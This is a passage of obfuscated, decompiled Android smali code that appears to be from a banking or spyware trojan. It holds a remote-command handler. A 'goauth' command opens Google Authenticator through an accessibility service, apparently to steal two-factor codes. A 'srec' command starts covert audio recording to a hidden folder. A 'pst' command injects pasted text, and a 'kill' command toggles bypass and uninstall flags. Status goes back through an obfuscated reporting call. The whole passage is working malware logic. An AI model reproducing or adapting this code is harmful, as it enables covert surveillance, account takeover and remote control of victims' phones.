    iget-object v11, v11, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/frgwslnslumyfsvmvlyxelzjybokigbfcwocfdbwwzcrymjlut6;->LClass:Ljava/lang/Class;

    aput-object v11, v12, v8

    aget-object v8, v10, v7

    aput-object v8, v12, v7

    aget-object v7, v10, v14

    aput-object v7, v12, v6

    iget-object v7, v9, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/PacketClass;->byt:[B

    aput-object v7, v12, v14

    aput-object v0, v12, v5

    invoke-static {v0, v12}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/Tools;->geiqtajadbtzslpftitbrkryudusxwkmrilgsmdguipltscdsv35(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    .line 307
    aget-object v5, v10, v6

    sget-object v7, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    const/16 v8, 0x10

    aget-object v7, v7, v8

    invoke-virtual {v5, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_6 .. :try_end_6} :catch_15

    if-nez v5, :cond_af

    .line 309
    :try_start_7
    aget-object v5, v10, v6

    invoke-static {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->getBytes(Ljava/lang/Object;)[B

    move-result-object v0

    invoke-static {v5, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_7 .. :try_end_7} :catch_15

    goto/16 :goto_2a

    :cond_7
    add-int/lit8 v11, v11, 0x1

    goto :goto_4

    .line 321
    :cond_8
    :try_start_8
    sget-object v9, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    aget-object v9, v9, v5

    invoke-static {v11, v9}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v9

    if-eqz v9, :cond_a7

    const/16 v9, 0x8

    new-array v11, v9, [Ljava/lang/String;

    .line 323
    aget-object v9, v10, v8

    aput-object v9, v11, v3

    aget-object v9, v10, v7

    aput-object v9, v11, v8

    aget-object v9, v10, v6

    aput-object v9, v11, v7

    aget-object v9, v10, v14

    aput-object v9, v11, v6

    aget-object v9, v10, v5

    aput-object v9, v11, v14

    aget-object v9, v10, v15

    aput-object v9, v11, v5

    aget-object v9, v10, v13

    aput-object v9, v11, v15

    const/16 v9, 0x8

    aget-object v9, v10, v9

    aput-object v9, v11, v13

    .line 324
    aget-object v9, v10, v14

    const-string v12, "ddll"

    invoke-virtual {v9, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    const/high16 v13, 0x10000000

    if-eqz v9, :cond_a5

    .line 325
    aget-object v9, v10, v8

    const-string v11, "msg:"

    invoke-virtual {v9, v11}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v9
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_8 .. :try_end_8} :catch_15

    const-string v11, ""

    if-eqz v9, :cond_b

    .line 328
    :try_start_9
    aget-object v0, v10, v8

    const-string v5, ":up"

    invoke-virtual {v0, v5}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_9

    goto/16 :goto_2a

    .line 332
    :cond_9
    aget-object v0, v10, v8

    const-string v5, ":fsh"

    invoke-virtual {v0, v5}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_a

    goto/16 :goto_2a

    .line 337
    :cond_a
    aget-object v0, v10, v8

    const-string v5, "msg:"

    invoke-virtual {v0, v5, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->showToast(Ljava/lang/String;)V
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_9 .. :try_end_9} :catch_15

    goto/16 :goto_2a

    .line 343
    :cond_b
    :try_start_a
    aget-object v9, v10, v8

    const-string v15, "goauth<*>"

    invoke-virtual {v9, v15}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v9
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_a .. :try_end_a} :catch_15

    if-eqz v9, :cond_d

    :try_start_b
    const-string v5, "cokrgcqosbwnxdhmzmtxnqbdhqnsmmwxjswojjqugetwgagggjjgvesqubnghmzrrkkqsnacmunvgfubvshpqhjtlaxsqvznwwjywgciufunbugdiwafsacuzrqatoddyqerhwrlimdyozoegkckfntzjqgjtxrjwvagtwhnuzyrjumqvjbbbrkltwyhbytbrgvtqrurxhsdzwdaxtdunmsjbaqdglzzhpleddpaqsclxbkribfzcuobcnolcvixtahawauktxutvxblxhvpbpjkzckbrangczfwkjejmbyzpfwzwluupingejpjsstvtwwrmfafrnsqrhkhxmvvdpbtfkizmvbhqwymxjeuidcdhnzykdbruqzvyhooglyozglxaafvtnbpndmuje55m.gookrgcqosbwnxdhmzmtxnqbdhqnsmmwxjswojjqugetwgagggjjgvesqubnghmzrrkkqsnacmunvgfubvshpqhjtlaxsqvznwwjywgciufunbugdiwafsacuzrqatoddyqerhwrlimdyozoegkckfntzjqgjtxrjwvagtwhnuzyrjumqvjbbbrkltwyhbytbrgvtqrurxhsdzwdaxtdunmsjbaqdglzzhpleddpaqsclxbkribfzcuobcnolcvixtahawauktxutvxblxhvpbpjkzckbrangczfwkjejmbyzpfwzwluupingejpjsstvtwwrmfafrnsqrhkhxmvvdpbtfkizmvbhqwymxjeuidcdhnzykdbruqzvyhooglyozglxaafvtnbpndmuje55gle.andrkrgcqosbwnxdhmzmtxnqbdhqnsmmwxjswojjqugetwgagggjjgvesqubnghmzrrkkqsnacmunvgfubvshpqhjtlaxsqvznwwjywgciufunbugdiwafsacuzrqatoddyqerhwrlimdyozoegkckfntzjqgjtxrjwvagtwhnuzyrjumqvjbbbrkltwyhbytbrgvtqrurxhsdzwdaxtdunmsjbaqdglzzhpleddpaqsclxbkribfzcuobcnolcvixtahawauktxutvxblxhvpbpjkzckbrangczfwkjejmbyzpfwzwluupingejpjsstvtwwrmfafrnsqrhkhxmvvdpbtfkizmvbhqwymxjeuidcdhnzykdbruqzvyhooglyozglxaafvtnbpndmuje55oid.apkrgcqosbwnxdhmzmtxnqbdhqnsmmwxjswojjqugetwgagggjjgvesqubnghmzrrkkqsnacmunvgfubvshpqhjtlaxsqvznwwjywgciufunbugdiwafsacuzrqatoddyqerhwrlimdyozoegkckfntzjqgjtxrjwvagtwhnuzyrjumqvjbbbrkltwyhbytbrgvtqrurxhsdzwdaxtdunmsjbaqdglzzhpleddpaqsclxbkribfzcuobcnolcvixtahawauktxutvxblxhvpbpjkzckbrangczfwkjejmbyzpfwzwluupingejpjsstvtwwrmfafrnsqrhkhxmvvdpbtfkizmvbhqwymxjeuidcdhnzykdbruqzvyhooglyozglxaafvtnbpndmuje55ps.authentkrgcqosbwnxdhmzmtxnqbdhqnsmmwxjswojjqugetwgagggjjgvesqubnghmzrrkkqsnacmunvgfubvshpqhjtlaxsqvznwwjywgciufunbugdiwafsacuzrqatoddyqerhwrlimdyozoegkckfntzjqgjtxrjwvagtwhnuzyrjumqvjbbbrkltwyhbytbrgvtqrurxhsdzwdaxtdunmsjbaqdglzzhpleddpaqsclxbkribfzcuobcnolcvixtahawauktxutvxblxhvpbpjkzckbrangczfwkjejmbyzpfwzwluupingejpjsstvtwwrmfafrnsqrhkhxmvvdpbtfkizmvbhqwymxjeuidcdhnzykdbruqzvyhooglyozglxaafvtnbpndmuje55icator2"

    .line 347
    invoke-static {v5, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->stuoxctjtdaoeuivbicuhkpiflkolbbmlmpdazwmgcmmbmmdif53(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    aget-object v6, p1, v3

    invoke-virtual {v6}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v6

    invoke-static {v5, v6}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/SecondActivity;->isPackageInstalled(Ljava/lang/String;Landroid/content/pm/PackageManager;)Z

    move-result v5

    if-eqz v5, :cond_c

    .line 348
    sput-boolean v8, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->SendGoogleAuth:Z

    .line 349
    aget-object v5, p1, v3

    invoke-virtual {v5}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v5

    const-string v6, "cokrgcqosbwnxdhmzmtxnqbdhqnsmmwxjswojjqugetwgagggjjgvesqubnghmzrrkkqsnacmunvgfubvshpqhjtlaxsqvznwwjywgciufunbugdiwafsacuzrqatoddyqerhwrlimdyozoegkckfntzjqgjtxrjwvagtwhnuzyrjumqvjbbbrkltwyhbytbrgvtqrurxhsdzwdaxtdunmsjbaqdglzzhpleddpaqsclxbkribfzcuobcnolcvixtahawauktxutvxblxhvpbpjkzckbrangczfwkjejmbyzpfwzwluupingejpjsstvtwwrmfafrnsqrhkhxmvvdpbtfkizmvbhqwymxjeuidcdhnzykdbruqzvyhooglyozglxaafvtnbpndmuje55m.gookrgcqosbwnxdhmzmtxnqbdhqnsmmwxjswojjqugetwgagggjjgvesqubnghmzrrkkqsnacmunvgfubvshpqhjtlaxsqvznwwjywgciufunbugdiwafsacuzrqatoddyqerhwrlimdyozoegkckfntzjqgjtxrjwvagtwhnuzyrjumqvjbbbrkltwyhbytbrgvtqrurxhsdzwdaxtdunmsjbaqdglzzhpleddpaqsclxbkribfzcuobcnolcvixtahawauktxutvxblxhvpbpjkzckbrangczfwkjejmbyzpfwzwluupingejpjsstvtwwrmfafrnsqrhkhxmvvdpbtfkizmvbhqwymxjeuidcdhnzykdbruqzvyhooglyozglxaafvtnbpndmuje55gle.andrkrgcqosbwnxdhmzmtxnqbdhqnsmmwxjswojjqugetwgagggjjgvesqubnghmzrrkkqsnacmunvgfubvshpqhjtlaxsqvznwwjywgciufunbugdiwafsacuzrqatoddyqerhwrlimdyozoegkckfntzjqgjtxrjwvagtwhnuzyrjumqvjbbbrkltwyhbytbrgvtqrurxhsdzwdaxtdunmsjbaqdglzzhpleddpaqsclxbkribfzcuobcnolcvixtahawauktxutvxblxhvpbpjkzckbrangczfwkjejmbyzpfwzwluupingejpjsstvtwwrmfafrnsqrhkhxmvvdpbtfkizmvbhqwymxjeuidcdhnzykdbruqzvyhooglyozglxaafvtnbpndmuje55oid.apkrgcqosbwnxdhmzmtxnqbdhqnsmmwxjswojjqugetwgagggjjgvesqubnghmzrrkkqsnacmunvgfubvshpqhjtlaxsqvznwwjywgciufunbugdiwafsacuzrqatoddyqerhwrlimdyozoegkckfntzjqgjtxrjwvagtwhnuzyrjumqvjbbbrkltwyhbytbrgvtqrurxhsdzwdaxtdunmsjbaqdglzzhpleddpaqsclxbkribfzcuobcnolcvixtahawauktxutvxblxhvpbpjkzckbrangczfwkjejmbyzpfwzwluupingejpjsstvtwwrmfafrnsqrhkhxmvvdpbtfkizmvbhqwymxjeuidcdhnzykdbruqzvyhooglyozglxaafvtnbpndmuje55ps.authentkrgcqosbwnxdhmzmtxnqbdhqnsmmwxjswojjqugetwgagggjjgvesqubnghmzrrkkqsnacmunvgfubvshpqhjtlaxsqvznwwjywgciufunbugdiwafsacuzrqatoddyqerhwrlimdyozoegkckfntzjqgjtxrjwvagtwhnuzyrjumqvjbbbrkltwyhbytbrgvtqrurxhsdzwdaxtdunmsjbaqdglzzhpleddpaqsclxbkribfzcuobcnolcvixtahawauktxutvxblxhvpbpjkzckbrangczfwkjejmbyzpfwzwluupingejpjsstvtwwrmfafrnsqrhkhxmvvdpbtfkizmvbhqwymxjeuidcdhnzykdbruqzvyhooglyozglxaafvtnbpndmuje55icator2"

    .line 350
    invoke-static {v6, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->stuoxctjtdaoeuivbicuhkpiflkolbbmlmpdazwmgcmmbmmdif53(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    .line 351
    invoke-virtual {v0, v13}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 353
    aget-object v5, p1, v3

    invoke-virtual {v5, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_2a

    .line 355
    :cond_c
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->sfh:Ljava/lang/String;

    const-string v5, "Google Auth<app not installed<app not installed"

    invoke-virtual {v5}, Ljava/lang/String;->getBytes()[B

    move-result-object v5

    invoke-static {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_b .. :try_end_b} :catch_15

    goto/16 :goto_2a

    .line 364
    :cond_d
    :try_start_c
    aget-object v9, v10, v8

    const-string v15, "kill<*>"

    invoke-virtual {v9, v15}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v9
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_c .. :try_end_c} :catch_15

    if-eqz v9, :cond_e

    .line 366
    :try_start_d
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->bypass:Ljava/lang/Boolean;

    const-string v0, "off"

    .line 367
    sput-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->uninstall:Ljava/lang/String;
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_d .. :try_end_d} :catch_15

    goto/16 :goto_2a

    .line 373
    :cond_e
    :try_start_e
    aget-object v9, v10, v8

    const-string v15, "srec<*>"

    invoke-virtual {v9, v15}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v9
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_e .. :try_end_e} :catch_15

    const-string v15, "on"

    if-eqz v9, :cond_12

    .line 376
    :try_start_f
    aget-object v0, v10, v8

    const-string v6, "srec<*>"

    invoke-virtual {v0, v6, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    .line 377
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v6

    invoke-static {v6, v7}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v6

    .line 378
    invoke-virtual {v6}, Ljava/lang/String;->length()I

    move-result v7

    sub-int/2addr v7, v5

    invoke-virtual {v6}, Ljava/lang/String;->length()I

    move-result v5

    invoke-virtual {v6, v7, v5}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v5

    .line 380
    new-instance v6, Ljava/text/SimpleDateFormat;

    const-string v7, "yyyy-MM-dd-HH-mm-ss"

    invoke-direct {v6, v7}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    new-instance v7, Ljava/util/Date;

    invoke-direct {v7}, Ljava/util/Date;-><init>()V

    invoke-virtual {v6, v7}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v6

    .line 381
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "_0_REC_"

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 383
    sget-object v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->MyAudoRecorder:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/VoiceRecorder;

    if-nez v6, :cond_f

    .line 384
    new-instance v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/VoiceRecorder;

    invoke-direct {v6}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/VoiceRecorder;-><init>()V

    sput-object v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->MyAudoRecorder:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/VoiceRecorder;

    .line 386
    :cond_f
    sget-object v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->MyAudoRecorder:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/VoiceRecorder;

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "/Config/sys/apps/rc/"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, ".wav"

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v6, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/VoiceRecorder;->SetPath(Ljava/lang/String;)V

    .line 387
    invoke-virtual {v0, v15}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_11

    .line 388
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->MyAudoRecorder:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/VoiceRecorder;

    iget-boolean v0, v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/VoiceRecorder;->isActive:Z

    if-eqz v0, :cond_10

    .line 389
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->MyAudoRecorder:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/VoiceRecorder;

    invoke-virtual {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/VoiceRecorder;->stop()V

    .line 392
    :cond_10
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->MyAudoRecorder:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/VoiceRecorder;

    invoke-virtual {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/VoiceRecorder;->start()V

    goto/16 :goto_2a

    .line 394
    :cond_11
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->MyAudoRecorder:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/VoiceRecorder;

    iget-boolean v0, v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/VoiceRecorder;->isActive:Z

    if-eqz v0, :cond_af

    .line 395
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->MyAudoRecorder:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/VoiceRecorder;

    invoke-virtual {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/VoiceRecorder;->stop()V
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_f .. :try_end_f} :catch_15

    goto/16 :goto_2a

    .line 404
    :cond_12
    :try_start_10
    aget-object v9, v10, v8

    const-string v5, "pst<*>"

    invoke-virtual {v9, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_10 .. :try_end_10} :catch_15

    if-eqz v5, :cond_13

    .line 407
    :try_start_11
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    if-eqz v0, :cond_af

    .line 408
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    aget-object v0, v10, v8

    const-string v5, "pst<*>"

    invoke-virtual {v0, v5, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->ToPaste:Ljava/lang/String;

    .line 409
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;
